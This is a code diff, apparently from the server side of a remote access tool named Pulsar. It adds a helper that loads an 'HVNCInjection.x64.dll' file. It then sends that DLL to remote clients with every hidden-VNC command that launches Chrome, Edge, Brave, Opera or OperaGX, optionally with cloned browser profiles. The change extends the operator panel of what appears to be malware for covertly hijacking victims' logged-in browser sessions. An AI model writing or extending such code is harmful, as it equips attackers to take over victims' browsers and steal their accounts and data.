@@ -494,6 +494,34 @@ namespace Pulsar.Server.Forms
 
         #endregion
 
+        #region Helper Methods
+        /// <summary>
+        /// Loads the HVNCInjection.x64.dll from the current working directory as bytes.
+        /// </summary>
+        /// <returns>The DLL bytes, or null if the file is not found.</returns>
+        private byte[] GetHVNCInjectionDllBytes()
+        {
+            try
+            {
+                string dllPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "HVNCInjection.x64.dll");
+                if (File.Exists(dllPath))
+                {
+                    return File.ReadAllBytes(dllPath);
+                }
+                else
+                {
+                    Debug.WriteLine($"HVNCInjection.x64.dll not found at: {dllPath}");
+                    return null;
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error loading HVNCInjection.x64.dll: {ex.Message}");
+                return null;
+            }
+        }
+        #endregion
+
         #region MenuItems
         private void menuItem1_Click(object sender, EventArgs e)
         {
@@ -508,7 +536,8 @@ namespace Pulsar.Server.Forms
             _connectClient.Send(new StartHVNCProcess
             {
                 Path = "Chrome",
-                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
+                DllBytes = GetHVNCInjectionDllBytes()
             });
         }
 
@@ -517,7 +546,8 @@ namespace Pulsar.Server.Forms
             _connectClient.Send(new StartHVNCProcess
             {
                 Path = "Edge",
-                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
+                DllBytes = GetHVNCInjectionDllBytes()
             });
         }
 
@@ -526,7 +556,8 @@ namespace Pulsar.Server.Forms
             _connectClient.Send(new StartHVNCProcess
             {
                 Path = "Brave",
-                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
+                DllBytes = GetHVNCInjectionDllBytes()
             });
         }
 
@@ -535,7 +566,8 @@ namespace Pulsar.Server.Forms
             _connectClient.Send(new StartHVNCProcess
             {
                 Path = "Opera",
-                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
+                DllBytes = GetHVNCInjectionDllBytes()
             });
         }
 
@@ -544,7 +576,8 @@ namespace Pulsar.Server.Forms
             _connectClient.Send(new StartHVNCProcess
             {
                 Path = "OperaGX",
-                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked
+                DontCloneProfile = !cLONEBROWSERPROFILEToolStripMenuItem.Checked,
+                DllBytes = GetHVNCInjectionDllBytes()
             });
         }
 
